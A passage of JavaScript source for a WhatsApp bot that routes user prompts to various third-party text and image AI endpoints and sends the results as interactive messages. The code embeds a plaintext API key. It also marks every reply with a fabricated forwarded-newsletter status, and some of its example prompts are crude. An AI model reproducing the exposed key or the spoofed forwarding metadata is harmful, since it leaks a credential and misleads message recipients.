        "key": "TouFyL4VyhWWNhqC3DnF5hAdR2fLXxgGY4Gpe4BqC8YGKE2j4NjuNrJAXetE",
        "prompt": text,
        "negative_prompt": "ugly, deformed, noisy, blurry, distorted, out of focus, bad anatomy, extra limbs, poorly drawn face, poorly drawn hands, missing fingers",
        "width": "720",
        "height": "720",
        "samples": "1",
        "num_inference_steps": "20",
        "seed": null,
        "guidance_scale": 7.5,
        "safety_checker": "yes",
        "multi_lingual": "no",
        "panorama": "no",
        "self_attention": "no",
        "upscale": "no",
        "embeddings_model": null,
        "webhook": null,
        "track_id": null
    });
    var requestOptions = {
        method: 'POST',
        headers: myHeaders,
        body: raw,
        redirect: 'follow'
    };
    try {
        let response = await fetch("https://stablediffusionapi.com/api/v3/text2img", requestOptions);
        let result = await response.json();
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Diffusion AI\n\n' + result.meta.prompt
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: result.output[0] } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"✨\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
    } catch (error) {
        console.log('error', error);
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: `${error.config.url}` } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"✨\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
    }
}
break
case 'indo-ai': {
	if (!text) return replygcalya(`*• Example:* ${prefix + command} halo`)
try {
let gpt = await (await fetch(`https://itzpire.com/ai/gpt-web?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Indo AI' + '\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcalya("`*Error*`")
}
}
break
case 'photoleap': {
	if (!text) return replygcalya(`*• Example:* ${prefix + command} blue sea`);
  let currentTime = Date.now();
  let lastUsed = 0;
  if (currentTime - lastUsed < 10000) return replygcalya("Cooldown 10 seconds, try again later");
  lastUsed = currentTime;
  try {
    let gpt = await (await fetch(`https://tti.photoleapapp.com/api/v1/generate?prompt=${text}`)).json();
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Photo Leap AI\n\n' + text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result_url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"✨\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
  } catch(e) {
    return replygcalya("`*Error*`");
  }
}
break
case 'ai':
case 'openai': {
	if (!text) return replygcalya(`*• Example:* ${prefix + command} what is your name`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/gpt?model=gpt-4&q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Chat GPT\n\n' + gpt.data.response
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcalya("`*Error*`")
}
}
    break
        case 'animate': {
    if (!text) return replygcalya(`*• Example:* ${prefix + command} a cat chasing mouse`);

    try {
        // Construct the API URL with the provided query
        const apiUrl = `https://itzpire.com/ai/animediff2?prompt=${encodeURIComponent(text)}`;

        // Fetch the response from the API
        const response = await fetch(apiUrl);

        // Check if the response is not OK
        if (!response.ok) {
            if (response.status === 500) {
                return replygcalya("*_Server Error (500): Unable to generate image, please try again later._*");
            } else {
                return replygcalya(`*_Error: ${response.status} ${response.statusText}_*`);
            }
        }

        // Parse the JSON response
        const data = await response.json();

        // Check if the status in the response data is not "success"
        if (data.status !== "success") {
            return replygcalya("*_An error occurred while fetching the image._*");
        }

        // Extract the photo URL from the response data
        const photoUrl = data.result;

        // Fetch the image from the URL
        const imgResponse = await fetch(photoUrl);
        const buffer = await imgResponse.arrayBuffer();

        // Prepare and send the image back to the user
        let media = await prepareWAMessageMedia({ image: Buffer.from(buffer) }, { upload: AlyaBotInc.waUploadToServer });

        let msgs = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: `> Animation AI\n\n_*Here is the result of: ${text}*_`
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: botname
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            ...media
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [{
                                "name": "quick_reply",
                                "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
                            }],
                        }),
                        contextInfo: {
                            mentionedJid: [m.sender],
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                                newsletterName: ownername,
                                serverMessageId: 143
                            }
                        }
                    })
                }
            }
        }, { quoted: m });

        await AlyaBotInc.relayMessage(m.chat, msgs.message, {});

    } catch (e) {
        console.error(e);
        return replygcalya("`*An unexpected error occurred. Please try again later*`");
    }
}
break;
        case 'diffusion-anime': {
	if (!text) return replygcalya(`*• Example:* ${prefix + command} what is your name`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/animediff2?prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Diffusion Anime AI\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: gpt.result} }, { upload: AlyaBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcalya("`*Error*`")
}
}
    break
case'bingai': {
	if (!text) return replygcalya(`*• Example:* ${prefix + command} what is your name`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/bing-ai?model=Balanced&q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Bing AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcalya("`*Error*`")
}
}
    break
    case 'travel-assistant': {
	if (!text) return replygcalya(`*• Example:* ${prefix + command} how can i visit taj mahal`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/copilot2trip?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Travel Assistant AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcalya("`*Error*`")
}
}
    break
    case 'dalle': {
	if (!text) return replygcalya(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/dalle?prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Dalle\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: AlyaBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcalya("`*Error*`")
}
}
    break
    case 'guru-ai': {
	if (!text) return replygcalya(`*• Example:* ${prefix + command} how to make girl pregnant`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/degreeGuru?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Guru AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcalya("`*Error*`")
}
}
    break
    case 'emi-ai': {
	if (!text) return replygcalya(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/emi?prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Emi AI\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: AlyaBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcalya("`*Error*`")
}
}
    break
    case 'claude-ai': {
	if (!text) return replygcalya(`*• Example:* ${prefix + command} how to make girl pregnant`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/claude?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Claude AI\n\n${gpt.result}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcalya("`*Error*`")
}
}
    break
    case 'costume-ai': {
	if (!text) return replygcalya(`*• Example:* ${prefix + command} how to make girl pregnant`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/gpt-logic?q=${text}&logic=${text}&realtime=true`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Costume AI\n\n${gpt.data.response}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcalya("`*Error*`")
}
}
    break
    case 'herc-ai': {
	if (!text) return replygcalya(`*• Example:* ${prefix + command} how to make girl pregnant`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-chat?model=v3&q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI\n\n${gpt.result.response}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcalya("`*Error*`")
}
}
    break
    case 'hercaiv1': {
	if (!text) return replygcalya(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=v1&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI V1\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: AlyaBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcalya("`*Error*`")
}
}
    break
    case 'hercai-cartoon': {
	if (!text) return replygcalya(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=v3&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Cartoon\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: AlyaBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcalya("`*Error*`")
}
}
    break
    case 'hercai-animefy': {
	if (!text) return replygcalya(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=animefy&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Animefy\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: AlyaBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcalya("`*Error*`")
}
}
    break
    case 'hercai-lexica': {
	if (!text) return replygcalya(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=lexica&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Lexica\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: AlyaBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcalya("`*Error*`")
}
}
    break
    case 'hercai-prodia': {
	if (!text) return replygcalya(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=prodia&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
